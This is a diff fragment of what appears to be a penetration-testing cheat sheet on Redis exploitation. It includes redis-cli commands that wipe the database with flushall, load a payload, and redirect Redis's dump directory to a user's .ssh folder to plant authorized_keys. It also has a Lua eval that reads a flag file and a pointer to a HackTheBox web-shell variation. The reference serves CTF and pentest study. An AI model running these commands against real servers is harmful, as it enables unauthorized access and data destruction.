@@ -46,7 +46,8 @@ eval "dofile('C:\\\\Users\\\\enterprise-security\\\\Desktop\\\\user.txt')" 0 # e
 
 [Redis RCE from packetstormsecurity](https://packetstormsecurity.com/files/134200/Redis-Remote-Command-Execution.html)  
 ```bash
-$ redis-cli -h 192.168.1.11 flushall$ cat foo.txt | redis-cli -h 192.168.1.11 -x set crackit
+$ redis-cli -h 192.168.1.11 flushall
+$ cat foo.txt | redis-cli -h 192.168.1.11 -x set crackit
 # Looks good. How to dump our memory content into the authorized_keys file? That’skinda trivial.
 $ redis-cli -h 192.168.1.11
 192.168.1.11:6379> config set dir /Users/antirez/.ssh/
@@ -60,7 +61,7 @@ OK
 6) OK
 ```
 
-[0xdf variation for Reddish](https://0xdf.gitlab.io/2019/01/26/htb-reddish.html)
+[0xdf variation for Reddish](https://0xdf.gitlab.io/2019/01/26/htb-reddish.html) - White space required!
 ```bash
 # 0xDF 
 # cmd.php:
